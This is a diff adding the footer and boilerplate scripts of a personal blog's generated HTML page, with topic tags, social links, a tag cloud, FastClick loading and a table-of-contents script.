+                        <a href="/tags/netease-cloud-music" title="netease-cloud-music">
+                            netease-cloud-music
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/offensive-and-defensive" title="offensive-and-defensive">
+                            offensive-and-defensive
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/rsa" title="rsa">
+                            rsa
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/security" title="security">
+                            security
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/serverless" title="serverless">
+                            serverless
+                        </a>
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                   
+                    
+                    <li>
+                        <a href="mailto:pumingdrinkcola@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+
+                    
+                    <li>
+                        <a href="https://twitter.com/puming4">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+
+                    
+
+		    
+                    
+                    <li>
+                        <a target="_blank" href="/img/wechat_qrcode.jpg">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-weixin fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/CalbeeMing0530">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://www.linkedin.com/in/%E6%98%8E-%E6%B5%A6-1798a3162/">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            <li>
+                <a target="_blank" href="https://www.instagram.com/calbeeming/">
+                    <span class="fa-stack fa-lg">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-instagram fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+            </li>
+            
+            
+                </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Ming Blog 2021
+                    <br>
+                    
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+</body>
+</html>
